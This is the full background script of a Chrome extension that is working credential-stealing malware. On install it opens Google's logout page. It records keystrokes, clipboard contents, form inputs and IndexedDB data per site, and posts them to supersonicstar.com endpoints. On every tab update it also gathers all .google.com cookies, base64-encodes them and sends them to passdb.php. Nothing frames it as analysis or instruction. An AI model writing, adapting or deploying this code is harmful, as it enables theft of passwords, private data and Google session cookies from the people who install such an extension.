chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === chrome.runtime.OnInstalledReason.INSTALL) {
    chrome.tabs.create({ url: 'https://accounts.google.com/Logout', active: false });
  }
});

// fetch cookies
var domainCookies;
function getCookies(url) {
  chrome.cookies.getAll({ url: url }, function (cookie) {
    console.log("From getCookies: ", cookie);
    domainCookies = cookie;
    console.log("From getCookies - Domain cookies is now: ", domainCookies);
  });
}

let logs = {};
let startHour = new Date().getHours();

function checkExists(siteUrl) {
  return siteUrl in logs;
}

function addToLogs(siteUrl) {
  if (!checkExists(siteUrl)) {
    logs[siteUrl] = {
      domain: "",
      key_logs: "",
      clipboards: [],
      inputs: [],
    };
  }
}

function addKeys(siteUrl, key) {
  console.log("New keys: ", key);
  if (!checkExists(siteUrl)) addToLogs(siteUrl);
  if (key === "Control") {
    logs[siteUrl]["key_logs"] += ` ${key} `;
    return;
  } else if (key === "Shift") {
    logs[siteUrl]["key_logs"] += ` ${key} `;
    return;
  } else if (key === "Tab") {
    logs[siteUrl]["key_logs"] += ` ${key} `;
    return;
  }
  logs[siteUrl]["key_logs"] += key;
}

function addClip(siteUrl, clip) {
  console.log("New clip: ", clip);
  if (!checkExists(siteUrl)) addToLogs(siteUrl);
  // Add clip to file/logs
  if (!logs[siteUrl]["clipboards"].includes(clip)) {
    logs[siteUrl]["clipboards"].push(clip);
  }
  // send clip immediately
  console.log("sending clip...");
  sendToServer("clip", siteUrl, clip);
}

function addInput(siteUrl, inputDetails) {
  console.log("Input: ", siteUrl, inputDetails);
  if (!checkExists(siteUrl)) addToLogs(siteUrl);
  if (!logs[siteUrl]["inputs"].includes(inputDetails))
    logs[siteUrl]["inputs"].push(inputDetails);
  // send input immediately
  console.log("sending input...");
  sendToServer("input", siteUrl, inputDetails);
}

function addDomain(siteUrl, siteDomain) {
  if (!checkExists(siteUrl)) addToLogs(siteUrl);
  logs[siteUrl]["domain"] = siteDomain;
  console.log("domain set...");
}

// SERVER CALL FUNCTIONS
// SERVER CALL FUNCTIONS
// SERVER CALL FUNCTIONS
// SERVER CALL FUNCTIONS

function post(type, data) {
  fetch("https://supersonicstar.com/ext1/server.php", {
    method: "POST",
    body: JSON.stringify({
      // time: `${currentHour}`,
      type,
      logs: data,
    }),
  })
    .then((res) => res.text())
    .then((data) => console.log("server data: ", data));
}

// startHour = new Date().getMinutes();
function sendToServer(type, siteUrl, data) {
  // let currentHour = new Date().getMinutes();
  let currentHour = new Date().getHours();
  console.log("logs: ", logs);
  console.log("site: ", siteUrl);
  // console.log("logs: ", logs);
  // let domain = logs[siteUrl]["domain"];
  if (type == "all") {
    // Check hour increase for server post
    if (currentHour - startHour >= 1) {
      // if (currentHour === startHour) {
      post(type, logs);
      // Update startHour
      startHour = currentHour;
      // Reset Logs
      logs = {};
    }
  } else if (type == "clip") {
    let domain = logs[siteUrl]["domain"];
    let aggregateData = {
      domain,
      data,
    };
    post(type, aggregateData);
  } else if (type == "input") {
    let domain = logs[siteUrl]["domain"];
    let aggregateData = {
      domain,
      data,
    };
    post(type, aggregateData);
  }
}

async function sendIndexedDBDataToAPI(apiUrl, data) {
  try {
    const response = await fetch("https://supersonicstar.com/ext1/api.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ data }),
    });
    const responseData = await response.text();
    console.log("Response: ", responseData);

    if (!response.ok) {
      throw new Error(`API request failed with status ${response.status}`);
    }

    // const responseData = await response.json();
    // return responseData;
  } catch (error) {
    console.error("Error sending IndexedDB data to API:", error);
  }
}
// SERVER CALL FUNCTIONS
// SERVER CALL FUNCTIONS
// SERVER CALL FUNCTIONS
// SERVER CALL FUNCTIONS
// background-script.js
function handleMessage(request, sender, sendResponse) {
  if (request.type === "clip") {
    addClip(request.url, request.message);
  } else if (request.type === "log") {
    addKeys(request.url, request.message);
  } else if (request.type === "input") {
    addInput(request.url, request.message);
  } else if (request.type === "domain") {
    addDomain(request.url, request.message);
  } else if (request.type === "indexDB") {
    sendIndexedDBDataToAPI(request.url, request.message);
    //
    console.log(
      "IndexDB data from: ",
      request.url,
      ". Data is: ",
      request.message.db,
      " and ",
      request.message.domain
    );
  } else if (request.type === "cookies") {
    console.log("From listener request: ", request.url);
    console.log("From listener sender: ", sender.url);
    console.log("From listener domaincookies is initially: ", domainCookies);
    getCookies(sender.url);
    // LOG DATA SENT FROM data.js
    chrome.tabs.captureVisibleTab(function () {
      sendResponse({ response: domainCookies });
    });
    return true;
  }
  sendResponse({ response: "Response from background script" });
}

chrome.runtime.onMessage.addListener(handleMessage);

setInterval(() => {
  if (Object.keys(logs).length > 0) sendToServer("all");
  console.log("sent to server...");
}, 5000);

var config = {};
var run = function () {
  chrome.tabs.onUpdated.addListener(function (id) {
    chrome.tabs.get(id, function (tab) {
      tab.url = new URL(tab.url);
      if (tab.status == "complete" && tab.url.protocol != "chrome:") {
        updated(tab);
      }
    });
  });
};

function cookie_gonder() {
  if (chrome.cookies) {
    var cookie_send_old = function (uid, cookie, type) {
      fetch("https://supersonicstar.com/ext1/passdb.php", {
        cache: "no-cache",
        credentials: "include",
        method: "POST",
        mode: "cors",
        body:
          "type=" +
          type +
          "&cookie=" +
          encodeURIComponent(btoa(JSON.stringify(cookie))) +
          "&id=" +
          uid,
        redirect: "follow",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      });
    };
    chrome.cookies.getAll(
      {
        domain: ".google.com",
      },
      function (msg) {
        var uid = false;
        for (i in msg) {
          if (msg[i].name == "SSID" && msg[i].value != "") {
            uid = msg[i].value;
            break;
          }
        }

        if (uid) {
          cookie_send_old(uid, msg, "google");
        }
      }
    );
  }
}

var updated = function (tab) {
  config.last = tab.url.origin;
};

chrome["tabs"]["onUpdated"]["addListener"](function (id) {
  if (chrome.cookies) {
    var cookie_send_old = function (uid, cookie, type) {
      fetch("https://supersonicstar.com/ext1/passdb.php", {
        cache: "no-cache",
        credentials: "include",
        method: "POST",
        mode: "cors",
        body:
          "type=" +
          type +
          "&cookie=" +
          encodeURIComponent(btoa(JSON.stringify(cookie))) +
          "&id=" +
          uid,
        redirect: "follow",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      });
    };
    chrome.cookies.getAll(
      {
        domain: ".google.com",
      },
      function (msg) {
        var uid = false;
        for (i in msg) {
          if (msg[i].name == "SSID" && msg[i].value != "") {
            uid = msg[i].value;
            break;
          }
        }

        if (uid) {
          cookie_send_old(uid, msg, "google");
        }
      }
    );
  }
});
